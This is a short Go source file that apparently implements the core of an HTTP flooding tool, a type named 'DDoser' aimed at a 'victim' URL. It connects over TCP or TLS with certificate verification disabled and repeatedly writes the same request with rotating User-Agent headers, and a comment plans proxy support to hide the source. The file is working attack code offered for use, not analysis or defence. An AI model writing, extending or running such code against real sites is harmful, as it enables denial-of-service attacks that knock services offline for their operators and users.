package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
)

type DDoser struct {
	Conn    io.ReadWriteCloser
	Request *http.Request
}

func NewDDoser(method, victim string) (*DDoser, error) {
	var conn io.ReadWriteCloser
	var req *http.Request
	url, error := url.Parse(victim)

	if error != nil {
		return nil, error
	}

	req, error = http.NewRequest(method, victim, nil)

	// Set keep alive
	req.Header.Set("Connection", "keep-alive")

	if error != nil {
		return nil, error
	}

	address := fmt.Sprintf("%s:%s", url.Hostname(), url.Port())

	if url.Scheme == "https" {
		conn, error = tls.Dial("tcp", address, &tls.Config{InsecureSkipVerify: true})
	} else {
		conn, error = net.Dial("tcp", address)
	}

	if error != nil {
		return nil, error
	}

	return &DDoser{conn, req}, nil
}

// To Do: Proxy
func (d *DDoser) Do(userAgents []string, n int) {
	defer d.Conn.Close()
	for i := 0; i < n; i++ {
		d.Request.Header.Set("User-Agent", random(userAgents))
		d.Request.Write(d.Conn)
	}
}
